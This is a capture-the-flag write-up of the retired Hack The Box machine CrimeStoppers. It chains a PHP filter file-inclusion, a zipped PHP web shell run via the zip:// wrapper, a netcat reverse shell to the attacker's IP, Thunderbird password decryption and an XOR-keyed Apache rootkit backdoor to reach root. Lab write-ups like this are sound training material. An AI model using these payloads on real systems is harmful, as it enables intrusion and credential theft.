# CrimeStoppers

This is the write-up for the box CrimeStoppers that got retired at the 2nd June 2018.
My IP address was 10.10.14.10 while I did this.

Let's put this in our hosts file:
```markdown
10.10.10.80    crimestoppers.htb
```

## Enumeration

Starting with a Nmap scan:

```markdown
nmap -sC -sV -o nmap/crimestoppers.nmap 10.10.10.80
```

```markdown
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.25 ((Ubuntu))
|_http-server-header: Apache/2.4.25 (Ubuntu)
|_http-title: FBIs Most Wanted: FSociety
```

## Checking HTTP (Port 80)

On the web page there are pictures and descriptions of fsociety from the Mr. Robot series.
In the menu there is a page called _Upload_ that redirects to _/?op=upload_ where we can send any text to the web server,

![Upload page](https://kyuu-ji.github.io/htb-write-up/crimestoppers/crimestoppers_web-1.png)

After sending this, it forwards to _/?op=view&secretname=613c59d9877e27846bf36b956b3583ae57de3dfb_.
Lets send this to **Burpsuite** to analyze the request.
```markdown
POST /?op=upload HTTP/1.1
Host: 10.10.10.80
(...)
Referer: http://10.10.10.80/?op=upload
(...)
Cookie: admin=0; PHPSESSID=f0nj42hba7vvlcqit2mbflv792
Upgrade-Insecure-Requests: 1

-----------------------------57644954119750401681032686728
Content-Disposition: form-data; name="tip"

 test
-----------------------------57644954119750401681032686728
Content-Disposition: form-data; name="name"

test
-----------------------------57644954119750401681032686728
Content-Disposition: form-data; name="token"

227dd67e5e6ea1454b8c74f5e19b83d1c0eb0ed38a687f175c7927982ebe36e9
-----------------------------57644954119750401681032686728
Content-Disposition: form-data; name="submit"

Send Tip!
-----------------------------57644954119750401681032686728--
```

The _op_ variable seems to have different parameters like _view ,upload and home_.
Also the cookie _admin=0_ is interesting, so lets change the value to _1_ and see what happens:

![List page](https://kyuu-ji.github.io/htb-write-up/crimestoppers/crimestoppers_web-2.png)

It shows a new menu in which it shows all the uploaded files. The hashes are tests from me, but _Whiterose.txt_ looks interesting and has the following content:
```markdown
Hello, <br /> You guys should really learn to code, one of the GET Parameters is still vulnerable. Most will think it just leads to a Source Code disclosure but there is a chain that provides RCE. <br /> Contact WhiteRose@DarkArmy.htb for more info.
```

The only GET parameters found so far are _op_ and _secretname_ and the first one is probably vulnerable.
After analyzing the page, it becomes clear that the values for _op_ are just PHP files on the server. When accessing them like _/view.php_, they just display a white page and not an error, so they exist and the variables execute them from another directory.

In this case, lets try a **Local File Inclusion** trick with PHP to get the source code of the scripts as a Base64-decoded string:
```markdown
http://10.10.10.80/?op=php://filter/convert.base64-encode/resource=home
```

Now copying the Base64-encoded string into a file and decoding it, to read the PHP code of _home.php_:
```markdown
base64 -d home.php.b64 > home.php
```

This can be done for all the PHP scripts that were found so far: _home.php, index.php, list.php, view.php, upload.php, common.php_.

In _common.php_ there is another hint as a comment:
```php
<?php
/* Stop hackers. \*/
if(!defined('FROM_INDEX')) die();

// If the hacker cannot control the filename, it's totally safe to let them write files... Or is it?
function genFilename() {
        return sha1($\_SERVER['REMOTE_ADDR'] . $\_SERVER['HTTP_USER_AGENT'] . time() . mt_rand());
}
?>
```

In _upload.php_ it says that files get uploaded to _http[:]//10.10.10.80/uploads/IP_ADDRESS/_ and when browsing there to my IP address, I can see the tips I uploaded as files:

![Uploaded tips as files](https://kyuu-ji.github.io/htb-write-up/crimestoppers/crimestoppers_web-3.png)

This means that uploaded tips become files on the web server which means that uploading a malicious file could get command execution.

### Getting command execution

As those files don't get the _.php_ extension, a **PHP wrapper** has to be used so the script gets executed. I will use the [ZIP compression wrapper for PHP](https://www.php.net/manual/de/wrappers.compression.php).

Creating a malicious _cmd.php_ PHP script:
```php
<?php echo system($\_REQUEST['test']); ?>
```

Compressing it with `zip`:
```markdown
zip cmd.zip cmd.php
```

The _cmd.zip_ has to be uploaded correctly on the box. To do that converting it to a Base64 string is helpful:
```markdown
base64 -w 0 cmd.zip

# Output
UEsDBAoAAAAAAPx1zVAoVK/eKQAAACkAAAAHABwAY21kLnBocFVUCQAD+8rkXgjL5F51eAsAAQQAAAAABAAAAAA8P3BocCBlY2hvIHN5c3RlbSgkX1JFUVVFU1RbJ3Rlc3QnXSk7ID8+ClBLAQIeAwoAAAAAAPx1zVAoVK/eKQAAACkAAAAHABgAAAAAAAEAAACkgQAAAABjbWQucGhwVVQFAAP7yuRedXgLAAEEAAAAAAQAAAAAUEsFBgAAAAABAAEATQAAAGoAAAAAAA==
```

Sending string as a request after decoding it with **Burpsuite**:

![Request in Burpsuite](https://kyuu-ji.github.io/htb-write-up/crimestoppers/crimestoppers_web-4.png)

Sending the request and the file _cmd.zip_ will be accessible on the box but with the hash name.
Now we can use the ZIP PHP wrapper to access the file and execute commands:
```markdown
http://10.10.10.80/?op=zip://uploads/10.10.14.10/4e8ba9796680f1631436ca74e8a921d29aee53dd%23cmd&test=whoami
```

This outputs the username _www-data_. Lets start a reverse shell on the box:
```markdown
GET /?op=zip://uploads/10.10.14.10/4e8ba9796680f1631436ca74e8a921d29aee53dd%23cmd&test=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.10 9001 >/tmp/f

# URL-encoded
GET /?op=zip://uploads/10.10.14.10/4e8ba9796680f1631436ca74e8a921d29aee53dd%23cmd&test=rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+10.10.14.10+9001+>/tmp/f
```

Now it started a reverse shell session as _www-data_.

## Privilege Escalation

There is one home directory from user _dom_ that can be accessed by us. In her home directory is a hidden _.thunderbird_ directory which could be useful to escalate privileges to her.
Compressing the **Thunderbird** profile with `tar` and put it into _/var/www/html/uploads/10.10.14.10/_ to download it to our local client:
```markdown
tar -cjvf /var/www/html/uploads/10.10.14.10/firefox.tar.bz2 36jinndk.default/
```

Decompressing it locally:
```markdown
tar -jxvf firefox.tar.bz2
```

Moving the folder into the default Thunderbird default folder for profiles:
```markdown
mv 36jinndk.default/ ~/.thunderbird/
```

The profiles can be accessed by adding it in the _profiles.ini_ and starting Thunderbird with the `-ProfileManager` parameter.

In the mailbox there is one received mail from _WhiteRose[@]DarkArmy.htb_ with a ransom note:
```markdown
Hello,

I left note on "Leave a tip" page but no response.  Major vulnerability exists in your site!  This gives code execution. Continue to investigate us, we will sell exploit!  Perhaps buyer will not be so kind.

For more details place 1 million ecoins in your wallet.  Payment instructions will be sent once we see you move money.
```

After this, _dom_ contacted _elliot_ to investigate the issue:
```markdown
Elliot.

We got a suspicious email from the DarkArmy claiming there is a Remote Code Execution bug on our Webserver.  I don't trust them and ran rkhunter, it reported that there a rootkit installed called: apache_modrootme backdoor.

According to my research, if this rootkit was on the server I should be able to run "nc localhost 80" and then type "get root" to get a root shell.   However, the server just errors out without providing any shell at all.  Would you mind checking if this is a false positive?
```

This information could be useful later.
In the meantime we can extract the password of _dom_ by using [Firefox-Decrypt](https://github.com/Unode/firefox_decrypt) which also works on Thunderbird profiles:
```markdown
python firefox_decrypt.py /root/.thunderbird/
```

When it asks for a password just pressing `enter` works as the profile is not password protected.
It outputs a password for _dom_:
```markdown
Website:   imap://crimestoppers.htb
Username: 'dom@crimestoppers.htb'
Password: 'Gummer59'
```

Changing users can be either done with `su -` from _www-data_ to _dom_ or by using SSH on the IPv6 address to login via SSH as there are firewall rules on IPv4:
```markdown
ssh dom@dead:beef::250:56ff:feb9:f170
```

### Privilege Escalation to root

Now that we are _dom_ lets investigate the mail she sent to _elliot_.
When searching for **apache_modrootme backdoor** there is a [GitHub repo called mod-rootme](https://github.com/sajith/mod-rootme) that works just like _dom_ explained in her mail.

The file in _/usr/lib/apache/modules/mod_rootme.so_ exists, so this is what has to be analyzed.
Lets download it to our local client:
```markdown
scp -6 dom@[dead:beef::250:56ff:feb9:f170]:/usr/lib/apache2/modules/mod_rootme.so .
```

Any debugger can be used for this **64-bit ELF binary** and I will use **Radare2**:
```markdown
r2 mod_rootme
```

Analyzing all functions with `aaa` and print them with `afl` and see there is an odd one called _sym.darkarmy_:
```markdown
afl

0x00000f70    4 50   -> 44   entry0
0x00001070   16 586  -> 563  sym.process_client
0x000016e0   46 919  -> 902  sym.shell_spooler
0x00001330   27 934  -> 904  sym.runshell_pty
0x00001ac0    3 61           sym.darkarmy
0x00000e40    3 23           sym.\_init
0x00001b78    1 9            sym.\_fini
0x000012c0    1 100          sym.runshell_raw
0x00000fb0    4 66   -> 57   sym.register_tm_clones
0x00001000    5 50           entry.fini0
0x00001040    4 48   -> 42   entry.init0
0x00001a80    1 44           sym.rootme_register_hooks
0x00001ab0    1 16           sym.rootme_post_config
0x00001b00    6 118  -> 116  sym.rootme_post_read_request
```

Printing disassembly of the function:
```markdown
pdf @sym.darkarmy
```

![Functions in Radare2](https://kyuu-ji.github.io/htb-write-up/crimestoppers/crimestoppers_re-1.png)

The function loads two effective addresses with a bytearray at `0x00001bf2` and the other one is a string called _"HackTheBox"_ into the registers _rdi_ and _rsi_.
After clearing _edx_ it goes into a loop where the first character of _rdi_ gets put into _ecx_ and XOR'ed against the first character of _rsi_.
It adds 1 byte to _rdx_ and checks if the length of the string is equal to `0xa` (which is 10 as HackTheBox has 10 characters) and jump back up and do it all over again to compare the second byte of _rdi_ and so on.

So what has to be done, is to grab the string at `0x00001bf2` and the string _"HackTheBox"_ and XOR them.
First lets take the hex data out of the memory address:
```markdown
px @0x00001bf2

0x00001bf2: 0e14 0d38 3b0b 0c27 1b01
```

These are the first 10 bytes of that address and now lets XOR that to the string with Python:
 ```python
b1 = bytearray("\x0e\x14\x0d\x38\x3b\x0b\x0c\x27\x1b\x01")
b2 = bytearray("HackTheBox")

for i in range(0,10):
    print(chr(b1[i] ^ b2[i]))
```

This outputs _"FunSociety"_ which can be used as a GET parameter to use the **apache_modrootme** rootkit:
```markdown
nc 10.10.10.80 80
GET FunSociety

# Output
rootme-0.5 DarkArmy Edition Ready
id
uid=0(root) gid=0(root) groups=0(root)
```

It started a shell on the box as root!
